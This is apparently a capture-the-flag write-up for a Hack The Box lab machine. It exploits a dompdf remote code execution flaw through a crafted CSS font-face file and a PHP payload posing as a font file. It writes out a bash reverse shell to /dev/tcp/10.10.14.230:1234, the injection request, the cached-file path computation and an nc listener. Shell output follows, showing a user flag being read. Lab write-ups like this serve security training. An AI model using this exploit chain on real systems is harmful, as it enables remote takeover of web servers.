1) I  found this PoC of an exploit: [https://github.com/positive-security/dompdf-rce](https://github.com/positive-security/dompdf-rce).

2) I create a file that I call style.css with this content:
```css
@font-face {  
font-family:'exploitfont';  
src:url('http://10.10.14.230:8000/exploit_font.php');  
font-weight:'normal';  
font-style:'normal';  
}
```

3) Then  I create another file that I call exploit_font.php with this content:
```php
^@^A^@^@^@
^@�^@^C^@ dum1^@^@^@^@^@^@^@�^@^@^@^Bcmap^@^L^@`^@^@^@�^@^@^@,glyf5sc�^@^@^@�^@^@^@^Thead^G�Q6^@^@^@�^@^@^@6hhea^@�^C�^@^@^A(^@^@^@$hmtx^DD^@
^@^@^AL^@^@^@^Hloca^@
^@^@^@^@^AT^@^@^@^Fmaxp^@^D^@^C^@^@^A\^@^@^@ name^@D^P�^@^@^A|^@^@^@8dum2^@^@^@^@^@^@^A�^@^@^@^B^@^@^@^@^@^@^@^A^@^C^@^A^@^@^@^L^@^D^@ ^@^@^@^D^@^D^@^A^@^@^@-��^@^@^@-����^@^A^@^@^@^@^@^A^@
^@^@^@:^@8^@^B^@^@3#5:08^@^A^@^@^@^A^@^@^W��^V_^O<�^@^K^@@^@^@^@^@�^U8^F^@^@^@^@�&۽^@
^@^@^@:^@8^@^@^@^F^@^A^@^@^@^@^@^@^@^A^@^@^@L��^@^R^D^@^@
^@
^@:^@^A^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^B^D^@^@^@^@D^@
^@^@^@^@^@
^@^@^@^A^@^@^@^B^@^C^@^A^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^D^@6^@^C^@^A^D       ^@^A^@^B^@^@^@^C^@^A^D  ^@^B^@^B^@^@^@^C^@^A^D  ^@^C^@^B^@^@^@^C^@^A^D  ^@^D^@^B^@^@^@s^@^@^@^@
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.230/1234 0>&1'");

```

4) I start a webserver with python3:
```
python3 -m http.server 8000
```

5) I send the request to inject css file:

--> Request:
```http
POST /api/html2pdf HTTP/1.1
Host: prd.m.rendering-api.interface.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 76

{"html":"<link rel=stylesheet href='http://10.10.14.230:8000/style.css'>"}
```

--> Response:
```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 23 Feb 2023 17:59:55 GMT
Content-Type: application/pdf
Content-Length: 919
Connection: close
X-Local-Cache: hit
Cache-Control: public
Content-Transfer-Encoding: Binary
Content-Disposition: attachment; filename=export.pdf


%PDF-1.7
1 0 obj
<< /Type /Catalog
/Outlines 2 0 R
/Pages 3 0 R >>
endobj
2 0 obj
<< /Type /Outlines /Count 0 >>
endobj
3 0 obj
<< /Type /Pages
/Kids [6 0 R
]
/Count 1
/Resources <<
/ProcSet 4 0 R
>>
/MediaBox [0.000 0.000 419.530 595.280]
 >>
endobj
4 0 obj
[/PDF /Text ]
endobj
5 0 obj
<<
/Producer (þÿ
```

6) Now I have need to get the file name of the file, I know:
```
name = `exploitfont`
font = `normal`
```

7) I must know even the md5(Hash):
```
┌──(kali㉿kali)-[~]
└─$ echo -n "http://10.10.14.230:8000/exploit_font.php" | md5sum
a1f8059d21c6a5509619894ebaa507e8  -

```

8) I put all together:
```
exploitfont_normal_a1f8059d21c6a5509619894ebaa507e8.php
```

9) I open the listening port:
```
┌──(kali㉿kali)-[~/Interface]
└─$ nc -lnvp 1234        
listening on [any] 1234 ...

```

10) I visit this directory (http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_a1f8059d21c6a5509619894ebaa507e8) to spawn the shell:
```
┌──(kali㉿kali)-[~/Interface]
└─$ nc -lnvp 1234        
listening on [any] 1234 ...
connect to [10.10.14.230] from (UNKNOWN) [10.10.11.200] 50794
bash: cannot set terminal process group (1299): Inappropriate ioctl for device
bash: no job control in this shell
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ cd /home/dev
cd /home/dev
www-data@interface:/home/dev$ ls -all
ls -all
total 32
drwxr-xr-x 4 dev  dev  4096 Jan 16 09:49 .
drwxr-xr-x 3 root root 4096 Jan 16 09:49 ..
lrwxrwxrwx 1 root root    9 Jan 10 12:56 .bash_history -> /dev/null
-rw-r--r-- 1 dev  dev   220 Jan 10 12:55 .bash_logout
-rw-r--r-- 1 dev  dev  3771 Jan 10 12:55 .bashrc
drwx------ 2 dev  dev  4096 Jan 16 09:49 .cache
drwx------ 3 dev  dev  4096 Jan 16 09:49 .gnupg
-rw-r--r-- 1 dev  dev   807 Jan 10 12:55 .profile
-rw-r--r-- 1 root dev    33 Feb 24 05:09 user.txt
www-data@interface:/home/dev$ whoami
whoami
www-data
www-data@interface:/home/dev$ cat user.txt
cat user.txt
ed25a0fee79a8bce596d413a5841b9dc
www-data@interface:/home/dev$ 
```